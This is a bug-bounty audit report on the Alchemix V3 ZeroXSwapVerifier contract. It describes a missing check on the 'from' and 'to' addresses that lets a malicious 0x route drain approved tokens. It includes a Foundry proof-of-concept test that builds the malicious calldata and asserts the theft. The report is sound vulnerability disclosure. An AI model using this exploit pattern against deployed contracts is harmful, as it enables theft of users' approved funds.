# 58079 sc low missing from validation in zeroxswapverifier verifyswapcalldata enables direct theft of approved funds

**Submitted on Oct 30th 2025 at 13:33:25 UTC by @Novathemachine for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58079
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`ZeroXSwapVerifier` approves malicious 0x routes because `_verifyTransferFrom()` never checks that the `from` address equals the `owner`. Once verified, a route can call `transferFrom(owner, attacker, amount)` and drain the owner’s approved tokens.

## Vulnerability Details

* **Where**: src/utils/ZeroXSwapVerifier.sol , `_verifyTransferFrom(bytes action, address owner, address targetToken, uint256 targetAmount)`.
* **What happens**: The function decodes `(token, from, to, amount)` but only enforces `token == targetToken`. It ignores `from` and `to`.

  ```solidity
  (address token, , , uint256 amount) = abi.decode(
      _slice(action, 4),
      (address, address, address, uint256)
  );
  require(token == targetToken, "IT");
  ```
* **Why it’s bad**: Any `transferFrom` embedded in a 0x route that pulls from the victim will pass verification as long as the token matches. With an existing allowance to the 0x spender, funds move directly to an attacker-controlled address.

## Impact Details

* **Impact chosen**: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.
* Any user who approved the 0x spender can lose their entire approved balance in a single verified route. No market or timing constraints limit the loss.

## References

* Vulnerable code: src/utils/ZeroXSwapVerifier.sol (`_verifyTransferFrom()`).

## Proof of Concept

## Proof of Concept

1. Add this test to src/test/ZeroXSwapVerifier.t.sol:

   ```solidity
   function testTransferFromArbitraryRecipientPassesVerification() public {
       address attacker = address(0xBEEF);
       uint256 amountToSteal = 10e18;

       vm.prank(owner);
       token.approve(spender, type(uint256).max);

       bytes memory maliciousAction = abi.encodeWithSelector(
           TRANSFER_FROM,
           address(token),
           owner,
           attacker,
           amountToSteal
       );

       ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
           recipient: attacker,
           buyToken: address(0),
           minAmountOut: 0,
           actions: new bytes[](1)
       });
       saa.actions[0] = maliciousAction;

       bytes memory calldata_ = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));

       bool verified = ZeroXSwapVerifier.verifySwapCalldata(
           calldata_,
           owner,
           address(token),
           10_000
       );
       assertTrue(verified, "verification unexpectedly failed");

       vm.prank(spender);
       token.transferFrom(owner, attacker, amountToSteal);

       assertEq(token.balanceOf(attacker), amountToSteal, "attacker did not receive stolen funds");
       assertEq(token.balanceOf(owner), 100e18 - amountToSteal, "owner balance mismatch after theft");
   }
   ```
2. Run the test:

   ```bash
   forge test --match-path src/test/ZeroXSwapVerifier.t.sol --match-test testTransferFromArbitraryRecipientPassesVerification
   ```
3. Expected result:
   * `verifySwapCalldata()` returns true, proving the malicious route is accepted.
   * `transferFrom(owner, attacker, amountToSteal)` succeeds, and balances reflect the theft.
